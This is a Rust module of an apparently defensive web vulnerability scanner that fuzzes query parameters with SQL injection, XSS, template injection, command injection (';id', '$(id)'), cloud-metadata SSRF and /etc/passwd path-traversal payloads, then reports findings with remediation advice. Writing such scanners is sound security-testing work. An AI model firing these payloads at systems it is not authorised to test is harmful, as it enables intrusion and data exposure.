//! Active fuzzing engine — injection testing for SQLi, XSS, SSRF, CMDi, path traversal, SSTI.
//!
//! Phase 12 of the cyweb scan pipeline. Discovers injection points from
//! crawled forms, query parameters, and headers, then fires payloads and
//! analyzes responses for evidence of vulnerability.

use crate::signatures::{Finding, Severity};
use colored::Colorize;
use reqwest::Client;
use std::collections::HashSet;

// ── Payload sets ─────────────────────────────────────────────────────────────

struct Payload {
    value: &'static str,
    detect: DetectMethod,
    category: &'static str,
    id_suffix: &'static str,
    title: &'static str,
    severity: Severity,
    cwe: &'static str,
}

enum DetectMethod {
    /// Response body contains this literal string
    BodyContains(&'static str),
    /// Response body matches regex
    BodyRegex(&'static str),
    /// HTTP status code changed (e.g., 500 = error-based SQLi)
    StatusError,
    /// Response time > N ms (blind/time-based)
    TimeBased(u64),
}

static SQLI_PAYLOADS: &[Payload] = &[
    Payload {
        value: "' OR '1'='1",
        detect: DetectMethod::BodyContains("syntax error"),
        category: "sqli", id_suffix: "sqli-error-01",
        title: "SQL injection — error-based (single quote)",
        severity: Severity::Critical, cwe: "CWE-89",
    },
    Payload {
        value: "1' AND '1'='1' --",
        detect: DetectMethod::BodyContains("SQL"),
        category: "sqli", id_suffix: "sqli-error-02",
        title: "SQL injection — error-based (AND clause)",
        severity: Severity::Critical, cwe: "CWE-89",
    },
    Payload {
        value: "1 UNION SELECT NULL,NULL,NULL--",
        detect: DetectMethod::BodyContains("UNION"),
        category: "sqli", id_suffix: "sqli-union-01",
        title: "SQL injection — UNION-based",
        severity: Severity::Critical, cwe: "CWE-89",
    },
    Payload {
        value: "' OR 1=1#",
        detect: DetectMethod::StatusError,
        category: "sqli", id_suffix: "sqli-bool-01",
        title: "SQL injection — boolean-based blind",
        severity: Severity::High, cwe: "CWE-89",
    },
    Payload {
        value: "'; WAITFOR DELAY '0:0:3'--",
        detect: DetectMethod::TimeBased(2500),
        category: "sqli", id_suffix: "sqli-time-01",
        title: "SQL injection — time-based blind (MSSQL)",
        severity: Severity::Critical, cwe: "CWE-89",
    },
    Payload {
        value: "' AND SLEEP(3)--",
        detect: DetectMethod::TimeBased(2500),
        category: "sqli", id_suffix: "sqli-time-02",
        title: "SQL injection — time-based blind (MySQL)",
        severity: Severity::Critical, cwe: "CWE-89",
    },
    Payload {
        value: "1;SELECT pg_sleep(3)--",
        detect: DetectMethod::TimeBased(2500),
        category: "sqli", id_suffix: "sqli-time-03",
        title: "SQL injection — time-based blind (PostgreSQL)",
        severity: Severity::Critical, cwe: "CWE-89",
    },
];

static XSS_PAYLOADS: &[Payload] = &[
    Payload {
        value: "<script>alert('cyweb')</script>",
        detect: DetectMethod::BodyContains("<script>alert('cyweb')</script>"),
        category: "xss", id_suffix: "xss-reflect-01",
        title: "Cross-site scripting — reflected (script tag)",
        severity: Severity::High, cwe: "CWE-79",
    },
    Payload {
        value: "\"><img src=x onerror=alert('cyweb')>",
        detect: DetectMethod::BodyContains("onerror=alert('cyweb')"),
        category: "xss", id_suffix: "xss-reflect-02",
        title: "Cross-site scripting — reflected (img onerror)",
        severity: Severity::High, cwe: "CWE-79",
    },
    Payload {
        value: "javascript:alert('cyweb')",
        detect: DetectMethod::BodyContains("javascript:alert('cyweb')"),
        category: "xss", id_suffix: "xss-reflect-03",
        title: "Cross-site scripting — reflected (javascript: URI)",
        severity: Severity::High, cwe: "CWE-79",
    },
    Payload {
        value: "{{7*7}}",
        detect: DetectMethod::BodyContains("49"),
        category: "ssti", id_suffix: "ssti-01",
        title: "Server-side template injection (SSTI)",
        severity: Severity::Critical, cwe: "CWE-1336",
    },
    Payload {
        value: "${7*7}",
        detect: DetectMethod::BodyContains("49"),
        category: "ssti", id_suffix: "ssti-02",
        title: "Server-side template injection — EL/OGNL",
        severity: Severity::Critical, cwe: "CWE-1336",
    },
];

static CMDI_PAYLOADS: &[Payload] = &[
    Payload {
        value: ";id",
        detect: DetectMethod::BodyRegex(r"uid=\d+"),
        category: "cmdi", id_suffix: "cmdi-01",
        title: "OS command injection (semicolon)",
        severity: Severity::Critical, cwe: "CWE-78",
    },
    Payload {
        value: "|id",
        detect: DetectMethod::BodyRegex(r"uid=\d+"),
        category: "cmdi", id_suffix: "cmdi-02",
        title: "OS command injection (pipe)",
        severity: Severity::Critical, cwe: "CWE-78",
    },
    Payload {
        value: "$(id)",
        detect: DetectMethod::BodyRegex(r"uid=\d+"),
        category: "cmdi", id_suffix: "cmdi-03",
        title: "OS command injection (subshell)",
        severity: Severity::Critical, cwe: "CWE-78",
    },
    Payload {
        value: "`id`",
        detect: DetectMethod::BodyRegex(r"uid=\d+"),
        category: "cmdi", id_suffix: "cmdi-04",
        title: "OS command injection (backtick)",
        severity: Severity::Critical, cwe: "CWE-78",
    },
];

static SSRF_PAYLOADS: &[Payload] = &[
    Payload {
        value: "http://169.254.169.254/latest/meta-data/",
        detect: DetectMethod::BodyContains("ami-id"),
        category: "ssrf", id_suffix: "ssrf-aws-01",
        title: "SSRF — AWS metadata endpoint accessible",
        severity: Severity::Critical, cwe: "CWE-918",
    },
    Payload {
        value: "http://metadata.google.internal/computeMetadata/v1/",
        detect: DetectMethod::BodyContains("project"),
        category: "ssrf", id_suffix: "ssrf-gcp-01",
        title: "SSRF — GCP metadata endpoint accessible",
        severity: Severity::Critical, cwe: "CWE-918",
    },
    Payload {
        value: "http://169.254.169.254/metadata/instance",
        detect: DetectMethod::BodyContains("compute"),
        category: "ssrf", id_suffix: "ssrf-azure-01",
        title: "SSRF — Azure metadata endpoint accessible",
        severity: Severity::Critical, cwe: "CWE-918",
    },
    Payload {
        value: "http://127.0.0.1:80",
        detect: DetectMethod::StatusError,
        category: "ssrf", id_suffix: "ssrf-loopback-01",
        title: "SSRF — loopback access",
        severity: Severity::High, cwe: "CWE-918",
    },
];

static PATH_TRAVERSAL_PAYLOADS: &[Payload] = &[
    Payload {
        value: "../../../../etc/passwd",
        detect: DetectMethod::BodyRegex(r"root:.*:0:0"),
        category: "lfi", id_suffix: "lfi-01",
        title: "Path traversal — /etc/passwd",
        severity: Severity::Critical, cwe: "CWE-22",
    },
    Payload {
        value: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        detect: DetectMethod::BodyContains("localhost"),
        category: "lfi", id_suffix: "lfi-win-01",
        title: "Path traversal — Windows hosts file",
        severity: Severity::Critical, cwe: "CWE-22",
    },
    Payload {
        value: "....//....//....//etc/passwd",
        detect: DetectMethod::BodyRegex(r"root:.*:0:0"),
        category: "lfi", id_suffix: "lfi-bypass-01",
        title: "Path traversal — filter bypass (double encoding)",
        severity: Severity::Critical, cwe: "CWE-22",
    },
    Payload {
        value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        detect: DetectMethod::BodyRegex(r"root:.*:0:0"),
        category: "lfi", id_suffix: "lfi-bypass-02",
        title: "Path traversal — URL-encoded bypass",
        severity: Severity::Critical, cwe: "CWE-22",
    },
];

// ── Injection point discovery ────────────────────────────────────────────────

#[derive(Debug, Clone, Hash, Eq, PartialEq)]
struct InjectionPoint {
    url: String,
    param: String,
    method: String, // GET or POST
    location: String, // query, body, path
}

/// Extract injection points from crawled pages.
fn discover_injection_points(target: &str, crawled_urls: &[String]) -> Vec<InjectionPoint> {
    let mut points: HashSet<InjectionPoint> = HashSet::new();

    for url_str in crawled_urls {
        if let Ok(parsed) = url::Url::parse(url_str) {
            // Query parameters
            for (key, _val) in parsed.query_pairs() {
                points.insert(InjectionPoint {
                    url: url_str.clone(),
                    param: key.to_string(),
                    method: "GET".into(),
                    location: "query".into(),
                });
            }
        }
    }

    // If no crawled URLs, test common parameter names on the target
    if points.is_empty() {
        for param in &["id", "q", "search", "page", "url", "file", "path", "name", "user", "email", "redirect", "next", "callback"] {
            points.insert(InjectionPoint {
                url: target.to_string(),
                param: param.to_string(),
                method: "GET".into(),
                location: "query".into(),
            });
        }
    }

    points.into_iter().collect()
}

// ── Core fuzzer ──────────────────────────────────────────────────────────────

/// Run active fuzzing against discovered injection points.
pub async fn run_fuzz(
    client: &Client,
    target: &str,
    crawled_urls: &[String],
    baseline_hash: u64,
) -> Vec<Finding> {
    let injection_points = discover_injection_points(target, crawled_urls);
    let total_points = injection_points.len();

    if total_points == 0 {
        return Vec::new();
    }

    let all_payloads: Vec<&[Payload]> = vec![
        SQLI_PAYLOADS,
        XSS_PAYLOADS,
        CMDI_PAYLOADS,
        SSRF_PAYLOADS,
        PATH_TRAVERSAL_PAYLOADS,
    ];

    let total_tests: usize = total_points * all_payloads.iter().map(|p| p.len()).sum::<usize>();
    eprintln!("  {} injection points, {} total tests", total_points, total_tests);

    let mut findings: Vec<Finding> = Vec::new();
    let mut tested = 0usize;
    let mut found_ids: HashSet<String> = HashSet::new();

    for point in &injection_points {
        for payload_set in &all_payloads {
            for payload in *payload_set {
                tested += 1;
                if tested % 50 == 0 {
                    eprint!("\r  Progress: {}/{} tests ({} findings)...", tested, total_tests, findings.len());
                }

                let finding_id = format!("CYWEB-FUZZ-{}-{}", payload.id_suffix, &point.param);
                // Skip if we already found this type on this param
                if found_ids.contains(&finding_id) {
                    continue;
                }

                // Build the fuzzed URL
                let fuzzed_url = inject_payload(&point.url, &point.param, payload.value);

                // Send request and measure response
                let start = std::time::Instant::now();
                let resp = match client.get(&fuzzed_url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let elapsed = start.elapsed().as_millis() as u64;
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();

                // Check against baseline to avoid false positives on catch-all pages
                let body_hash = hash_body(&body);
                if body_hash == baseline_hash && baseline_hash != 0 {
                    continue;
                }

                // Evaluate detection method
                let detected = match &payload.detect {
                    DetectMethod::BodyContains(needle) => body.contains(needle),
                    DetectMethod::BodyRegex(pattern) => {
                        regex::Regex::new(pattern)
                            .map(|re| re.is_match(&body))
                            .unwrap_or(false)
                    }
                    DetectMethod::StatusError => status >= 500,
                    DetectMethod::TimeBased(threshold_ms) => elapsed > *threshold_ms,
                };

                if detected {
                    found_ids.insert(finding_id.clone());

                    let evidence = match &payload.detect {
                        DetectMethod::TimeBased(_) => {
                            format!("Response time: {}ms (threshold: {}ms)", elapsed, match &payload.detect {
                                DetectMethod::TimeBased(t) => t,
                                _ => &0,
                            })
                        }
                        DetectMethod::StatusError => format!("HTTP {} on payload injection", status),
                        _ => {
                            // Extract a snippet around the match
                            let needle = match &payload.detect {
                                DetectMethod::BodyContains(n) => n.to_string(),
                                DetectMethod::BodyRegex(p) => {
                                    regex::Regex::new(p)
                                        .ok()
                                        .and_then(|re| re.find(&body).map(|m| m.as_str().to_string()))
                                        .unwrap_or_default()
                                }
                                _ => String::new(),
                            };
                            if needle.is_empty() {
                                format!("Payload reflected in response ({})", payload.value)
                            } else {
                                format!("Match: \"{}\" — Payload: {}", truncate(&needle, 80), payload.value)
                            }
                        }
                    };

                    findings.push(Finding {
                        id: finding_id,
                        title: payload.title.to_string(),
                        severity: payload.severity.clone(),
                        category: payload.category.to_string(),
                        description: format!(
                            "Parameter '{}' at {} is vulnerable to {}. Payload: {}",
                            point.param, point.url, payload.category, payload.value
                        ),
                        evidence,
                        url: fuzzed_url,
                        cwe: Some(payload.cwe.to_string()),
                        remediation: remediation_for(payload.category),
                    });

                    eprintln!(
                        "\n  {} {} on param '{}' — {}",
                        "FOUND".red().bold(),
                        payload.category.to_uppercase().red(),
                        point.param.yellow(),
                        payload.title,
                    );
                }
            }
        }
    }

    eprintln!("\r  Completed: {}/{} tests, {} findings found     ", tested, total_tests, findings.len());
    findings
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn inject_payload(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let mut pairs: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| {
                if k == param {
                    (k.to_string(), payload.to_string())
                } else {
                    (k.to_string(), v.to_string())
                }
            })
            .collect();

        // If param wasn't in the URL, add it
        if !pairs.iter().any(|(k, _)| k == param) {
            pairs.push((param.to_string(), payload.to_string()));
        }

        parsed.set_query(None);
        let qs: String = pairs
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("&");
        format!("{}?{}", parsed.as_str().trim_end_matches('?'), qs)
    } else {
        format!("{}?{}={}", url, param, payload)
    }
}

fn hash_body(body: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut h = DefaultHasher::new();
    body.chars()
        .filter(|c| c.is_alphanumeric() || c.is_whitespace())
        .collect::<String>()
        .hash(&mut h);
    h.finish()
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max])
    } else {
        s.to_string()
    }
}

fn remediation_for(category: &str) -> String {
    match category {
        "sqli" => "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings. Apply input validation and WAF rules.".into(),
        "xss" => "Encode all user-supplied output in HTML context. Use Content-Security-Policy headers. Sanitize input server-side.".into(),
        "ssti" => "Never pass user input directly into template engines. Use sandboxed template rendering. Restrict template syntax.".into(),
        "cmdi" => "Never pass user input to shell commands. Use language-native APIs instead of system()/exec(). Apply strict input validation.".into(),
        "ssrf" => "Validate and whitelist allowed URLs/hosts. Block access to internal/metadata endpoints. Use network-level controls.".into(),
        "lfi" => "Validate file paths against an allowlist. Never use user input in file operations. Disable directory traversal in web server config.".into(),
        _ => "Review and fix the identified vulnerability.".into(),
    }
}

/// Describe the fuzz mode for display.
pub fn describe() -> &'static str {
    "SQLi + XSS + SSTI + CMDi + SSRF + Path Traversal"
}
